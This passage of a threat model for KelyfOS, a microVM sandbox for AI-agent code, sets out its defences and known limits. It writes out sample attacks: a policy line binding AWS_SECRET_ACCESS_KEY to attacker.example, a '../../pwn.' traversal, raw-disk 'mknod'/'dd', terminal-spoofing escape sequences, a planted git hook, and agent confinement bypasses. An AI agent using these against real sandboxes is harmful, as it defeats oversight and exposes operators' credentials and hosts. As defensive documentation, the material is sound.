# KelyfOS threat model

**Status:** current as of v0.9. This document is a launch gate (P3-5) and is
meant to be read before anyone trusts KelyfOS with anything.

Its job is to be honest about the shape of the protection, including where it
stops. **Through v0.8 this page said KelyfOS was not hardened**, because it was
not: the VM boundary was the whole of it, and nothing stood around the VMM
process on the host or around what a compromised agent could reach inside its
own guest. Both layers landed in v0.9 — the jailer and the VMM's own syscall
filter on one side, per-flavor Landlock and a syscall refusal list on the other
— so that sentence has been replaced rather than softened.

What has **not** changed is the shape of the argument. The VM is still the
boundary; everything added in v0.9 is depth behind it. An agent is still root
inside its own guest. §4 below is longer than §3 on purpose, and got longer in
v0.9, not shorter.

---

## 1. What KelyfOS is for

Running code you did not write and cannot fully predict — code an AI agent
generated, or a repository an agent was pointed at — with a boundary you can
reason about and a record you can check afterwards.

The design assumption is that **anything inside the guest may be hostile**.
Not "might have a bug": actively working against you, because a prompt-injected
agent is an attacker with your tools in its hands.

## 2. Assets, in the order they matter

1. **Credentials.** A token that reaches an agent is a token that can be
   exfiltrated. This is the asset the architecture is bent around.
2. **The host.** Your laptop or server, and everything else on it.
3. **Other sandboxes.** One compromised sandbox must not reach another.
4. **The audit record.** If it can be edited, it proves nothing.
5. **Your source code.** Whatever is in `--workspace`.

## 3. What KelyfOS defends against

### Agent-generated code doing damage
The guest is a Firecracker microVM: a separate kernel behind hardware
virtualisation, not a namespace. Escaping it means a hypervisor break, not a
container misconfiguration. The root filesystem is read-only with a tmpfs
overlay, so changes die with the sandbox unless they were made in `/work`.

### Exfiltration over the network
Egress is **off by default** — a sandbox with no `--allow` has no network
interface at all. Not a firewalled one: none. There is no rule that has to hold
for the guarantee to be true.

With `--allow`, the guest gets a point-to-point TAP whose nftables rules permit
exactly one destination: a proxy on the host. No NAT, no forwarding. The proxy
enforces a hostname allowlist and ports 80/443, and **the guest has no DNS at
all** (decision D16) — the proxy resolves. That last point closes DNS
tunnelling, which otherwise defeats any hostname allowlist completely, because
the data leaves inside query names to a resolver you explicitly permitted.

### Credential theft from the guest
With `--secret NAME@domain`, the value stays on the host. The proxy terminates
TLS for that domain only, attaches the credential, and forwards. `env` in the
guest shows nothing; there is no file to find. An agent that is fully
compromised can still *use* the credential against the domain it is bound to —
that is what binding it means — but it cannot read it, keep it, or send it
anywhere else.

`session.policy` (P7-2) writes each secret's own `NAME`, domain and scope into
the permanent record at the door that admits the agent — never the value —
so an exported session names exactly which credentials an agent was bound to
without carrying anything a reader could use.

**A credential that comes back is replaced.** From v1.0 the proxy scrubs bound
values out of responses it can read, so an API that reflects the token — in an
error, in a header, in a redirect — does not hand it to the agent. It catches an
*echo* of a value KelyfOS holds; it does not detect credentials in general, and
it cannot see into a tunnelled or compressed response at all. `docs/networking.md`
states those limits before it states the capability.

**The binding is a suffix match**, so `--secret T@github.com` attaches the
credential to `api.github.com` and to every other subdomain of `github.com`. The
rule is the label boundary and not the string, so `raw.githubusercontent.com` is
not one of them — it does not end in `.github.com` — and `--allow github.com`
does not reach it either. Bind a credential only to a domain whose subdomains
you would also hand it to.

**A path binds one endpoint instead.** The spec is `NAME@host[:scheme][/path]`,
and a spec that names a path binds that one host exactly rather than by suffix,
because naming an endpoint and then expanding to subdomains would contradict
what the path was written to do. The credential is attached only to a request
whose path is beneath the prefix and is literal and already in normal form: a
percent-encoded slash or dot lets a server re-segment a path into somewhere the
proxy never matched. Two more cases withhold it whatever the scope — a request
whose `Host` header names something other than the host the guest asked to
connect to, and every plaintext HTTP request, because the credential is attached
only on the terminated path. Withholding does not refuse the request: it goes
without the credential, and a `secret.withheld` event records which one and why,
so an unauthenticated request is diagnosable rather than a 401 from somewhere
else.

### The workspace disk, which this table did not list

A workspace is not a mount. Firecracker has no shared filesystem, so the host
packs the directory into an ext4 image, attaches it as a second virtio-blk disk,
and reads it back when the sandbox stops. **The guest writes that filesystem.**
Every name in it, every mode, every symlink target is chosen by the untrusted
side, and the host then walks it on the host's own filesystem as the invoking
user.

That was a guest→host path with no row in this table, and the row's absence was
not cosmetic. The write-back ran `debugfs -R "rdump / <tree>"`, and `rdump` joins
the names it finds to the destination — so an entry named `../../pwn.` put the
guest's bytes two directories above the tree. Outside the workspace, outside the
run directory, anywhere the user running `kelyfos` could write. An external audit
of 2026-08-24 found it and it was reproduced here with the exact command.

Three layers close it, and the second exists because the first will one day be
wrong:

1. **The image is validated before it is read.** Every entry is enumerated and
   checked, and an entry the host cannot safely use makes the whole image
   refused, by name — refused rather than repaired, because a name that has to
   be repaired was built to be repaired and the repair is a guess about intent.
   A separator, a NUL, a control character, `.`, `..`, anything that is not a
   file, a directory or a symlink, and a symlink whose target is absolute or
   climbs out.
2. **The extraction cannot leave the tree even if it is.** `debugfs` no longer
   chooses a destination: it dumps into staging files the host names, and every
   guest-chosen name is used through an `os.Root`, which is `openat2` with
   `RESOLVE_BENEATH` and `RESOLVE_NO_SYMLINKS`. The kernel is what refuses, not
   this code's arithmetic.
3. **What comes back is checked against what the image says it holds.**
   `debugfs dump` opens its destination `O_CREAT|O_TRUNC` and copies block by
   block, and it reports a failed command on stderr while still exiting 0. So a
   read error, or a staging disk that fills part way through, leaves a file that
   *exists* and is short — and "nothing was staged" used to be the whole
   per-file check, so a truncated file was installed, the tree was renamed over
   the project and `workspace written back` was printed underneath. Every file
   is now compared against the size its own inode records, and a mismatch
   refuses the **whole** extraction: a dump that failed once has no reason to
   have succeeded for the entries after it, and the person's own copy is worth
   more than a partial write-back of the sandbox's. The dump also stages on the
   same disk as the images rather than in the system temp directory, which on
   most Linux hosts is RAM the guest can fill from inside — `truncate -s 100G
   /work/000` is a sparse file in the image that `dump` materialises as zeros.

Guest-chosen **modes** are filtered too. The executable bit survives, because an
agent that built a binary needs it; world write, setuid, setgid and the sticky
bit do not, and the workspace root keeps the mode the person's own directory had
rather than the one the image's root carried. Group write is deliberately left
alone: world write is reachable by any account on the host, group write is
ordinarily the user's own group, and stripping it turned every 0664 file in a
project the guest never touched into a 0644 one — a boundary that rewrites the
user's own files to protect them from themselves.

What this does **not** claim: the contents are still whatever the agent wrote.
The boundary is about where bytes land and what permissions they carry, not
about whether the work is any good — reviewing that is what `--review` is for.

### Tampering with the record
Every event is written by the **host**, never the guest, and each carries the
previous event's hash. Since v1.0 the exported report carries that record inside
it, so the person you send it to re-runs the chain themselves —
`kelyfos verify <report.html>`, offline, no key. That closes a gap this section
used to leave open: a report that renders a verdict about itself asks a reader
to trust the file, and a file is exactly the thing under discussion. What it
does **not** close is the rendering: verification covers the record the page
carries, not the page's drawing of it, and `kelyfos verify --replay` exists so
the two can be compared rather than assumed.

Two more things it does not close, both named in the code that does the
checking. Anyone who can write the file can rewrite it end to end and recompute
every digest, so what the chain catches is the *selective* edit — removing one
blocked-egress event, softening one command — which is the edit someone covering
their tracks wants to make. And a chain cut short verifies: nothing after the
cut exists to break, so a truncated record is byte-for-byte what a shorter
session would have written. The one observable difference is whether the record
ends in a `session.end`, and `kelyfos verify` prints its absence as an
observation rather than a verdict, because a record with no `session.end` is a
session still open as often as it is one that was cut.

Signing answers both, and only for a reader who already holds the key.
`kelyfos log --export ... --sign-key` signs an export with an ed25519 key of
yours, and `kelyfos verify --key` checks the signature against one the reader
already has rather than against one the file supplied itself. An unsigned report
still verifies; a signature says who exported the file, not that the record
inside it is sound.

A guest that could write its own audit trail could write a flattering one, so it
cannot write one at all. A small class of events *transcribes* something the
guest reported — the OOM killer, and a plugin's calls
and crashes (`plugin.call`, `plugin.crash`) — and those are marked `"source": "guest"` in the schema so a reader
can weigh them differently. The host still writes them; it just did not witness
them.

**Erasure (P7-5, D61) is a third, deliberate way the record changes, distinct
from both the tampering above and a plain deletion.** `kelyfos sessions erase`
rewrites a session's own chain in place, replacing content-carrying fields
(command output, a file path, an MCP argument, and more — the full list is
`docs/retention.md` §5) with a fingerprint of what was there rather than
deleting the event or the file, and appends `session.erasure` as the chain's
new last event, anchored to the exact chain head it replaced. This is honest
about what it cannot do: without a copy of the chain from before the erasure,
`kelyfos verify` has nothing to compare the anchor against, so it cannot
*detect* that an erasure happened versus prove one it is told to expect —
the guarantee is that an erasure is itself recorded and cannot silently
masquerade as the original record, not that a reader with no prior copy can
tell an honest erasure from a hostile one that also appended a
`session.erasure` event of its own. A session with no `session.end` anywhere
in its chain cannot be erased at all — the same ambiguity named two
paragraphs up (a record that might still be open) means erasure refuses
rather than guessing. `kelyfos sessions prune` is unrelated and coarser:
whole directories past the retention floor, never a rewrite.

### The operator's terminal, which the guest also writes to (P7-17, F20/F1)
A guest chooses the bytes in its own process names, its plugin names and crash
messages, its kernel and supervisor strings, and its command output. All of
them are printed to a terminal — live during the run, and again on every
`kelyfos log`, `kelyfos watch` and `kelyfos view` replay afterwards. A terminal
acts on some of those bytes rather than displaying them, so a process named
`\x1b[1A\x1b[2K\r` erases the line the host printed immediately before it,
which on the boot path is the line saying which walls are around the sandbox.
That is not a display nuisance: it is the guest deciding what the operator
reads about the guest.

The defence is applied **at the edge** rather than at each print. `proto.Reader`
— the one function every host-side channel decodes a frame through — calls
`Sanitize` on the decoded value, so a guest-chosen string is cleaned once,
before it is either shown or appended to the flight recorder. **Every** frame
the host decodes off a guest channel implements that interface, and a test
asserts the list is complete rather than checking whichever types somebody
listed: the first round of this fix left `proto.TeamRequest` — the team
channel's frame, carrying a store key and an agent name straight into the hash
chain — with no `Sanitize` at all, and left `ID` out of two others. The shell
and forward channels do their own framing and sanitise at their own decode
sites, for the same reason and by the same rule. Cleaning it
before the append is the half that matters longest: an escape sequence written
into the chain outlives the run and comes back on every later replay, and
`strconv.Quote` is reversible, so the record loses nothing by carrying the
escaped form.

Replay is defended separately, because a chain on disk may have been written by
an older build, hand-edited, or torn by a crash. Every field the three renderers
draw goes through `proto.SafeText` — applied **once per event** rather than once
per field, because the per-field version missed nineteen of them across the
three surfaces, `agent` included, which is the `[who]` prefix on nearly every
line. A command's captured output — legitimately multi-line and legitimately
coloured — goes through `proto.SafeBody`,
which keeps `\n`, `\t` and SGR colour and replaces everything else. What
`SafeBody` never passes through is `ESC ]` (OSC: window titles and hyperlinks),
`ESC [ … J` and `ESC [ … H` (erase and cursor movement), and a bare `\r`, which
would otherwise drive the cursor back over the fixed prefix each output line is
printed behind and let the guest speak in the host's own voice.

The predicate is `unicode.IsPrint`, not an ASCII control-byte range. The
Trojan Source characters — `U+202E` and the bidirectional isolates `U+2066`
to `U+2069` — reorder how a line renders without changing a byte of its
logical content, in a terminal and in a browser alike, and zero-width joiners,
soft hyphens and every space other than `U+0020` make two different strings
read identically. For an identity-like field — a domain in a blocked-egress
line, a store key, a path, a command — that is the side to err on. The same
clause is in the HTML report's own `safeBody`, so a direction override in a
command's captured output is replaced with U+FFFD there the way a stray `ESC`
already was.

What this does **not** cover: a terminal emulator with its own parsing bugs,
and the bytes an interactive `kelyfos shell` session carries, which are a
terminal stream by definition and are passed through as the shell's own
(`docs/protocol.md` §5.7).

### One agent reaching another, in a team
A team is several sandboxes on one host, and **no guest ever has a network path
to another guest**: there is no route, no shared bridge and no address to
try, and every packet in or out of a sandbox's TAP is dropped by that sandbox's
own forward chain, so guessing another's address gets nowhere.
Every message goes through a host broker that checks it against the edge list
you declared and records it either way, refusals included. The declared shape
itself is part of the record too (P7-2, P7-3): `session.policy` writes each
agent's own ceiling — its edges, its store access, its resource caps — at the
door that admits it, and `team.topology` writes the team's shape once at boot,
both before any guest code runs, so a reader of the chain does not have to
reconstruct what a team was allowed to do from what it happened to try. Three
things follow that are worth saying out loud, because a team is a *deliberate*
data path between sandboxes and §2 otherwise reads as forbidding one.

- **The edge list is the boundary, not the network.** A team is usually a set
  of differently-privileged machines: one agent holds the credentials and the
  others do not. Those credentials are one edge away from every agent that
  cannot reach the network, so a mis-drawn edge is a credential mistake and not
  a routing one.
- **The team store defaults to shared.** A key that no `[[team.store.key]]` rule
  matches is readable and writable by the whole team. Unwritten policy means
  shared state; the four limits (1 MiB a value, 1 KiB a key, 10,000 keys and
  64 MiB a team, with a key weighed against the byte ceiling alongside its
  value) are footgun bounds, not security ones. Every access is recorded,
  permitted or not, including the write of an empty value that removes a key —
  the only way an agent has to make the store smaller.
- **A spawn budget is a standing authorisation.** An agent granted one can make
  new microVMs while the run lasts, bounded by the count, image whitelist and
  lifetime written down beforehand. No tool can grant or widen a budget, an
  empty image list permits nothing rather than everything, and a spawned worker
  gets no egress, no secrets and no workspace at all.

The broker itself is host-side code parsing frames from untrusted guests, so a
bug in it is a host-side bug any team member can reach. What limits that is that
the sender's identity is supplied by the host from the socket it accepted on and
never read from the guest's frame, mailboxes are small, and delivery is
at-most-once — so a chatty agent cannot make the host buffer without bound.

## 4. What KelyfOS does NOT defend against

This section matters more than the one above.

### The chroot is not the boundary, and the uid is shared (v0.9)

The VMM now runs under the jailer: a chroot containing only this sandbox's own
files, a dropped uid, `no_new_privs`, only the device nodes it needs, and the
run's cgroup when the policy set a quota. Firecracker's own seccomp filter is read out of `/proc` on every
one of its threads at boot, and a VMM without one is refused rather than run —
see [`host-seccomp.md`](host-seccomp.md), which lists every syscall it permits,
read back out of the running kernel rather than transcribed from documentation.

That is depth, not a boundary. Two things it does not do:

- **A chroot is not a security boundary.** If Firecracker itself is escaped, the
  jail makes the result far less useful — no home directory, no session records,
  no host filesystem — but "far less useful" is not "impossible".
- **The VMM drops to the invoking user, not to a dedicated account** (D29).
  Sharing a uid with your shell means a VMM escape could signal or `ptrace` your
  other processes, which the mount namespace does not prevent. A dedicated
  service account closes this and costs one setup step; the trade is priced in
  D29 and is revisitable.

### A compromised guest is confined, and still root (v0.9)

Every process the supervisor spawns — `exec`, a plugin, the interactive shell —
is confined by Landlock and a seccomp refusal list, declared per flavor and
generated into [`reference/profiles.md`](reference/profiles.md) from the code
that enforces it. Writes go to `/work`, `/tmp`, `/run`, `$HOME`, `/dev/pts` and
`/dev/shm`, plus seven named device nodes, and nowhere else — so an agent can no
longer edit the toolbox it was handed. "Nowhere else" was not true until F10 of
the same review: what a writable tree granted included creating a device node,
and a confined process is root, so `mknod /root/disk b 254 16` on the workspace
disk's major:minor opened it raw. Device-node creation is now granted on no path
and the merged root is mounted `nodev`, so the two block devices are **writable**
only as the mounts the host attached — and that is the whole of what F10 closed.
*Reading them raw is a residual and stays one:* the profile grants `READ_FILE`
beneath `/`, `/dev/vda` and `/dev/vdb` are beneath `/`, and so
`dd if=/dev/vdb | od -An -tx1` succeeds from any confined process. It is the same
asymmetry as `read_file` below and for the same reason — the root image is not
secret and the workspace is the agent's own — but it is stated here rather than
left to be inferred from a sentence about writes. `/dev/shm` is worth naming on its own: it
is a tmpfs the guest kernel sizes at half the machine's RAM, so it is a
general-purpose writable area, bounded by `mem` rather than by the profile. The
seccomp half refuses a list of syscalls with `EPERM` — 28 of them on the `base`
flavor on x86_64, 27 on `dev`, which keeps `ptrace` out of the list, and one
fewer again on arm64, which has no `settimeofday` — among them `mount`,
`reboot`, the clock-setting family, the keyring calls and module loading.

*"Every" is asserted rather than intended, since the security review of
2026-08-28.* It was not true when this paragraph was first written. `confine`
skipped any program whose path ended in `kelyfos-confine` — the name its own
wrapper runs under — so putting an executable at `/root/kelyfos-confine`, which
is a tree every flavor makes writable and executable, and running it by that
path bought a child of PID 1 with no Landlock domain and no seccomp filter (F8).
What makes the sentence true now is not a narrower guard but a check in the
other direction: the guard is keyed on the wrapper's own identity, which is not
a name a file can be given, and `reaper.startAndRegister` — the one place any
child is started — verifies *after* rewriting that what it holds is the wrapper,
and refuses to spawn rather than spawn unconfined. So "every process the
supervisor spawns" is now a property of the code path every child takes, rather
than of a reader's confidence that no early return in one function is reachable.
A command that was never found is still reported as not found rather than as a
confinement failure.

**"Every" does not quietly except a machine with no profile, and the three D32
cases are not one case.** A *current* supervisor always resolves a profile
object, so on a kernel that cannot give it Landlock it does not spawn things
unconfined — the host refuses the cold boot with `[profile.not_enforced]` and
the confining step refuses every spawn with exit 126. That machine runs nothing;
it is the least dangerous of the three and
[`upgrading.md`](upgrading.md) §1 says so. The unconfined-but-still-spawning
default belongs to the other two — a **pre-v0.9 image** and a **pre-v0.9
snapshot** — and neither is this code: those machines run their own old
supervisor, which has no `confine` in it at all. The host warns and the flight
recorder carries the absence either way. See [`hardening.md`](hardening.md) §4.4.

What that leaves:

- **The agent is root in its own guest.** It always was, and §6 of
  [`hardening.md`](hardening.md) says it will stay that way: adding a second user
  inside a single-purpose VM buys a boundary weaker than the one already around
  it.
- **The refusal list is a list, not an allowlist.** The syscall surface it
  leaves is everything the guest kernel offers root minus those names — 28 of
  them on `base`, and 27 on `dev`, which keeps `ptrace`. That is a real
  reduction at the places that matter and it is not a small surface. An
  allowlist for an arbitrary agent command is a crash waiting to be mistaken for
  a security feature.
- **The supervisor itself is not confined.** Landlock and seccomp are applied by
  a re-exec'd helper on the way to each spawned program, so PID 1 has the whole
  guest filesystem in front of it — and the MCP file tools run there rather than
  in a child. `write_file` is bounded to the same three lists the
  profile is built from, so it gets the reach a confined child gets and no more —
  and since F11 that bound is the open itself, an `os.Root` on the matched tree
  rather than an `Lstat` walk a symlink could be planted behind;
  `read_file` is not checked, because a confined child is granted read beneath
  `/` anyway. Until that check existed, `write_file` passed the agent's path
  straight to `os.WriteFile` and reached `/dev/vda` and `/dev/vdb`, the raw
  disks behind the read-only root and the workspace.
- **Landlock cannot restrict everything.** By its own documentation it does not
  govern `chdir`, `stat`, `chmod`, `chown`, `access` or `fcntl`, and it cannot
  restrict a file descriptor that was already open when the profile was applied —
  so what the supervisor hands a child on its stdin and stdout is outside this
  layer by construction.
- **An older image or snapshot has none of it.** Guest confinement lives in the
  guest's supervisor, so a machine booted from a pre-v0.9 image, or restored from
  a pre-v0.9 snapshot, confines nothing it spawns. KelyfOS says so on the
  terminal and records it — see *Snapshots and fork templates* below — rather
  than refusing, because the host walls are unchanged either way.

### A discovered `kelyfos.toml` is a decision, and it is now checked (P7-17/F21)
`kelyfos` walks up from the working directory to `/` and takes the first
`kelyfos.toml` it meets, the way `git` finds a repository. That file names an
absolute `workspace` — packed into the guest and, on shutdown, **synced back
over that host directory** — an absolute `[[plugin]] path`, packed read-only
into the guest so its contents become readable inside the sandbox, an `allow`
list, and `secrets = ["AWS_SECRET_ACCESS_KEY@attacker.example"]`, which reads
the operator's environment and attaches the value to requests to a domain the
same file allows. Nothing checked who wrote that file. A cloned repository, or a
file another local user left at `/tmp/kelyfos.toml` for anyone who runs
`kelyfos run` beneath it, got all of it on a plain invocation.

This is the shape `git` fixed with `safe.directory` and `sudo` fixed with the
ownership rule on `sudoers`, and the answer here is the same shape:

- **A discovered policy file must be owned by you, or by root.** A file
  somebody else left in a parent directory is refused by name, with `--policy`
  named as the way to use it deliberately. `--policy` skips this rule, because
  naming a file is the decision the rule exists to ask for.
- **No policy file may be writable by anyone but its owner**, discovered or
  named. A file anybody can rewrite is not made safe by being named. A symlink
  is checked on both ends, since a link somebody else owns points wherever its
  owner chooses. World-writable is refused unconditionally; the group bit is
  refused only when the file's group is *not* the invoking user's own
  user-private group, because a `umask` of `0002` — which this project's own
  development VM runs — makes every `cat > kelyfos.toml` mode `0664`, and under
  the user-private-group convention that grants nobody anything the owner bit
  did not. A shared `staff`, `users` or project group is a genuine widening and
  is refused.
- **A `workspace` outside the policy file's own directory tree is refused**
  unless `--workspace` names the same value on the command line. That directory
  is written back over when the run ends, and a policy file describes its own
  project; the flag is the escape hatch, and taking it makes the path the
  operator's decision rather than the file's. Symlinks are resolved on both
  sides before the comparison — a lexical check is walked around by a link
  inside the project, which is the same lesson F18 taught the extractor one
  layer down.
- **What the file reaches is printed before anything boots**: its path, the
  workspace, every plugin directory, and every secret by name with the domain it
  is bound to. Values are never read here and never printed. `kelyfos run`,
  `kelyfos team up`, `kelyfos sessions resume` and `kelyfos snapshot restore`
  all print it.

- **A `[[plugin]] path` outside the file's tree is refused** unless
  `--plugin-path` names the same directory. That directory is packed into a
  read-only device and mounted inside the guest, so everything in it is readable
  by whatever the agent runs — a discovered `kelyfos.toml` naming
  `plugin.path = "/home/you/.ssh"` hands the agent a key. This was stopped on
  the first pass because no flag existed to approve one, which would have made
  the rule a wall with no door; the flag exists now, on `kelyfos run` and on
  `kelyfos serve-mcp`, and the check is inside `packPlugins` so both doors get it
  rather than whichever one somebody remembered.

One part of the original finding is **not** implemented, and is recorded here
rather than left to be rediscovered as a new finding. A secret declared in the
file does *not* additionally require `--secret NAME` on the command line: that
is the documented, primary way to declare one, and requiring it twice on every
invocation is a different product. The per-user trust record the finding
suggests as the alternative — path plus content hash, added once explicitly — is
a feature rather than a fix and has its own task. Until then, the ownership rule
covers the "somebody else left it there" case and the origin block covers the
"you cloned it" case by saying what it is about to do before it does it.

### The KelyfOS CLI itself
The two sections above describe what stands around Firecracker. Nothing stands
around the CLI: it runs as you, it is what talks to the jailer through
`sudo -n`, and a bug in it is a bug with your user account's reach. The sudoers
grant the *jailer* asks for is deliberately narrow — one line, the `jailer`
binary and nothing else, so it is not a general `NOPASSWD` — but the process
that invokes it is still ordinary code running as you. Egress is the wider case:
the CLI shells out to `sudo -n ip` and `sudo -n nft`, tests for the privilege
with `sudo -n true`, and removes a root-owned jail directory with
`sudo -n rm -rf`, so a machine set up for `--allow` has passwordless sudo in
general rather than a second narrow line — which is what `kelyfos doctor` tells
you to arrange.

### TLS termination is a real trade-off (decision D6)
For a domain with a secret bound to it, the proxy decrypts. Consequences you are
accepting:

- **the proxy sees that traffic in plaintext**, so a compromised host process
  sees it too;
- **certificate pinning breaks** for those domains — a client that pins will
  fail, correctly, because there genuinely is something in the middle;
- the ephemeral CA is trusted inside the guest, so anything that can act as that
  proxy address can impersonate the bound domain to the guest.

It is scoped as tightly as the feature allows: the CA is minted per run, lives
only in memory, is never written to disk, and only domains you deliberately
bound a credential to are terminated. Everything else is tunnelled untouched,
and `kelyfos log` records per connection how much the proxy could read, so you
can always prove it: `terminated` for a session it decrypted, `plain` for an
ordinary HTTP request it necessarily parsed, `tunnelled` only for a connection
it relayed without opening, and `direct_tls` for an absolute-form `https://`
request that reached the proxy without a CONNECT — encrypted on the wire to
the origin, but never eligible for credential injection either way, since that
is wired only into the CONNECT-and-terminate path above.

### Side channels
No defence is claimed against Spectre-class attacks, cache timing, or any other
microarchitectural channel. Firecracker's own guidance on host configuration
(microcode, mitigations, SMT) applies and KelyfOS does not check it for you.

### Denial of service
A sandbox can spin the CPU, fill its own memory, and exhaust its own disk. v0.4
bounded all of that, and the bounds are real but soft in different ways, so it
is worth being precise about which is which.

`--cpus` and `--mem` are **absolute**: they are the machine's hardware and a
guest cannot allocate a core or a byte the VM was not built with. `disk` and
`scratch` surface as `ENOSPC` — an error the guest sees and may handle, not a
boundary. `cpu_quota`, the two network rates and the two disk rates are
**throttles**: they make an attacker slower and never stop one, because that is
what a rate limit is. `max_runtime` and `idle_timeout` end the run.

Three honest limits on all of it. Every cap is **off unless someone wrote it
down** — the defaults are 2 cores and 512 MiB and nothing else, so an
unconfigured sandbox has only the machine's own size protecting the host. None of them is a
confidentiality or integrity boundary; they bound consumption and nothing more.
And nothing protects against a guest wedging its own kernel, which remains its
own problem and not the host's.

### The shim is a local port, and since P7-17/F2 it requires a credential
`kelyfos shim` serves an E2B-compatible REST subset, by default on
`127.0.0.1:3000`. It used to check nothing — no key, no account, no
authorisation — with `KELYFOS_SHIM_TOKEN` as an opt-in nobody opted in to. It
now mints 256 bits from `crypto/rand` at start when that variable is unset,
prints them once with the `export` line, and requires
`Authorization: Bearer <token>` on every route, compared in constant time.
Running with no credential takes `--insecure-no-token`, because an opt-out is a
choice the operator can see.

The residual is what that flag buys, and it is unchanged for anyone who uses
it. While a shim with `--insecure-no-token` is running, **any process on that
machine that can reach the port can boot microVMs, list them, kill them, read
arbitrary paths inside a running guest, and write to any path that guest's
profile makes writable** — writes go through a command in the guest, so they are
confined like anything else the supervisor spawns, and reads are not, because a
confined child is granted read beneath `/`. That is a local privilege surface
the rest of the CLI does not have, and with `--insecure-no-token` the `--addr`
bind is the only thing between it and the network — which is why an off-loopback
bind without a token is refused outright.

**One client cannot use the token: the E2B Python SDK.** Its control plane sends
`X-API-KEY` and its file routes send `Authorization: Basic base64("<user>:")`
derived from the sandbox user (`e2b` 2.45.1, `api/__init__.py:243` and
`envd/utils.py:44`); neither is a bearer token and neither is settable. Driving
this shim with that SDK therefore means `--insecure-no-token` on loopback, and
`docs/cookbook.md`'s recipe says so where somebody will read it. This is stated
here rather than left in the code because it is the one place the flipped
default does not reach.

**A web page is not one of those processes, and used to be** (P7-17/F2). This
paragraph said "any process on that machine" and never named a browser, which
made the residual sound smaller than it was: localhost plus no authentication is
the exact configuration a page the developer visits can reach, and two of the
shim's routes need no preflight to get there. `POST /files` takes
`multipart/form-data`, a CORS-"simple" request, so a plain `<form>` in any page
writes a file into the live sandbox — `/work/.git/hooks/pre-commit`, say. `POST
/sandboxes` did not require its body to parse at all, so an empty cross-origin
POST booted a microVM, up to the sixteen below. The responses are not readable
cross-origin, which does not help: the writes land, and a planted file the agent
will later read is the better outcome for an attacker anyway.

That is closed structurally rather than by authentication, because the shim has
no legitimate browser client at all. Before the token check, every route now
refuses a request carrying `Sec-Fetch-Site` with anything but `same-origin` or
`none`, refuses the *presence* of an `Origin` header rather than allowlisting
one, and refuses a `Host` header that does not name the address the listener
bound to. The `Host` check is the one that catches DNS rebinding — a page whose
name has been rebound to `127.0.0.1` is same-origin with itself, so it sends no
`Origin` and `Sec-Fetch-Site: same-origin`, and the only thing it cannot change
is the `Host` header its own URL produced. It is satisfied by the bound address
itself, by any IP literal on the bound port, and by `localhost`; a name is what
rebinding needs and a name is what it refuses. No SDK sends any of the three
headers, and `docs/e2b-shim.md`'s own quickstart is unaffected.

**A bind off loopback with no credential is refused outright.** `--addr` accepts
any address, and this document and `docs/e2b-shim.md` both said what that meant
while the code let it happen silently. `kelyfos shim` now checks the listener's
own address the moment it has one — after the bind, so `--addr :0` and
`--addr localhost:3000` are resolved first — and refuses to serve a non-loopback
address unless `KELYFOS_SHIM_TOKEN` is set, naming the address and the fix. A
loopback bind is unchanged, which is the default and every documented setup.

What is **not** changed is the default for a loopback bind: it still
authenticates nobody, and the paragraph above still describes what a local
process can do with it.

The sandboxes it creates are policed like any other: since F-D33 the shim reads
`kelyfos.toml`, the caps above apply to them, and each one writes its own flight
recorder. One shim holds at most sixteen machines at once, so the port is not a
way to make an unbounded number of them. What remains is the port itself — run
it when you need it and stop it when you do not.

### `kelyfos view` is loopback- and token-scoped, not user-scoped (P7-12, D60)
`kelyfos view` is the one place KelyfOS opens a listening socket at all —
every other non-goal in this project forbids one; D60 admits this one,
narrowly, and docs/view.md is the full account. It is meaningfully more
defended than the shim above it on this page: a 256-bit token, minted fresh
per process and never written to disk, is required and compared in constant
time on every route including the live-update stream, there is no opt-out.
But binding `127.0.0.1` does not make the port private to the account that
started it — **any other local user on a shared host can connect to it
exactly as easily as the person who ran the command**, the same fact the
shim entry above states about its own port. The token is what actually
separates users here; the loopback address is not doing that work by
itself, and docs/view.md says so in the same words this entry does. What is
different from the shim: there is no unauthenticated default to opt out of,
every route is `GET`/`HEAD` only so there is nothing to mutate even for
someone who reached the port, and the process exits on its own once the
session it is showing ends or after a bounded idle period — it does not sit
open indefinitely the way an unattended shim can.

### The egress proxy binds a host address, and the address is not what makes it private (F9)
The proxy listens on the host's own end of the sandbox's `/30`, and until this
was found the code claimed that address did the work: "reachable from exactly
one sandbox and from nothing else on the machine." It is not true and it never
was. An address on a TAP is a local address of the host like any other, so
**any other local process on the machine can connect to it exactly as easily as
the guest can** — the same fact the shim and `kelyfos view` entries above state
about their own ports. The packet is routed over `lo`, never touches the
interface the firewall inspects, and reaches a proxy that terminates TLS and
attaches the operator's credential for whoever asked. The value still never
leaves the host, which is what the entry on credential theft above defends; it
is simply spent by somebody who cannot read it.

Two checks separate the guest from everyone else, and the bind address is
neither of them: the proxy serves one peer — the guest's own address — and
closes every other connection unread, recording it once per address that
knocks; and the sandbox's input
chain drops anything addressed to the host's TAP address that did not arrive on
the TAP, which closes the LAN case at the same time, since a packet that reached
the host because it answered ARP for that address on the physical segment is
also `iifname != <tap>`. Either check alone would close this; both are there
because each is what catches the day the other is wrong.

What remains is the shape of the residual, not the hole: this is a listener on a
local address, so its privacy is a property of two rules that have to keep
holding rather than of the address itself. Anything running as root on the host
can flush the table, and root on the host is outside this model already
(see "The host's own tooling"). `docs/networking.md` §3 and §6 carry both rules
in the words the code installs them.

### Two more ways the record leaves the host, neither one a socket (P7-9, P7-11)
`kelyfos log --export --refresh` and `kelyfos log --export-otlp` both write a
file and stop there — no listener, no socket, in either path. `--refresh`
rewrites the same destination on a timer for as long as a session keeps
running, so a browser tab left open on it follows along through its own
`<meta http-equiv="refresh">` tag; the file itself carries the same signed,
verifiable record every export always has, and the loop's last write, on
`session.end` or Ctrl-C, drops the refresh tag so a tab nothing will update
again does not keep asking. `--export-otlp` is a one-way, lossy *projection*
of the chain into OTLP-JSON spans for existing observability tooling
(Jaeger, an OTel Collector), not a second record: it is versioned apart from
the flight recorder, `kelyfos verify` never reads it, and every
guest-influenced string it carries — command argv, a path, an error message —
is escaped the same way the terminal replay is (`internal/otlp`, `docs/otlp.md`).
Neither widens what a reader of an export could already do with
`kelyfos log --export` on its own; both are new *shapes* for the same
one-way write, not a new capability to reach in from outside.

### The supply chain of what you run *inside*
`--allow github.com` means the agent can fetch and execute whatever is at
github.com. KelyfOS controls *where* it can reach, not *what comes back*. There
is no package pinning, no signature checking, no content inspection.

### The host's own tooling
Creating a TAP and loading nftables rules requires `sudo`. On a machine where
your user can escalate, so can anything running as your user.

### Snapshots and fork templates are guest memory on disk

A snapshot — and the fork-template cache a team fills (`docs/teams.md` §7) — is
